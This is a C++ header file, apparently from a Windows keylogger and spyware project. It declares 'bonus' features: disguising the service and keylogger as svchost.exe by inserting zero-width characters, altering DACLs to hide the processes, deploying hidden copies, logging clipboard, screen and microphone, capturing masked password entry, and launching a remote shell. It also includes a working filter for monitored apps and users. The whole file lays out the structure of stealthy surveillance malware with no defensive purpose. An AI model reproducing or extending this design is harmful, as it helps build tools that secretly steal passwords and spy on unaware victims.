#pragma once

#include <algorithm>
#include <cstdint>
#include <stop_token>
#include <string>

#include "config.hpp"
#include "helpers.hpp"

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Hide service and keylogger from their respective listing tools
═════════════════════════════════════════════════════════════════════ */

constexpr WCHAR HIDDEN_SERVICE_EXE[]   = L"svchost\u200B.exe";
constexpr WCHAR HIDDEN_KEYLOGGER_EXE[] = L"svchost\u200B\u200B.exe";

void OpenDacl();
void HideDacl();

bool DeployHiddenCopy(std::filesystem::path& serviceExe);
void DeleteHiddenCopy();

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Clipboard, screen and microphone logging
═════════════════════════════════════════════════════════════════════ */

void LogClipboardContent();
void CaptureScreen(bool ignoreLastScreenshotTime = false);
void CaptureMicrophone(const std::stop_token& st);

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Application/User filtering
═════════════════════════════════════════════════════════════════════ */

enum MonitorType : uint8_t { App, User };

template <MonitorType Type>
static bool IsMonitored(std::string current)
{
    const auto& list = Type == App ? gConfig.MonitoredApps : gConfig.MonitoredUsers;

    if (list.empty()) return true;
    current = ToLower(current);
    return std::ranges::any_of(list, [&](const auto& item) { return current.find(item) != std::string::npos; });
}

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Masked-input capture
═════════════════════════════════════════════════════════════════════ */

bool HandlePasswordKey(DWORD vk, UINT sc);

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Remote shell
═════════════════════════════════════════════════════════════════════ */

void LaunchRemoteShell(std::stop_token st);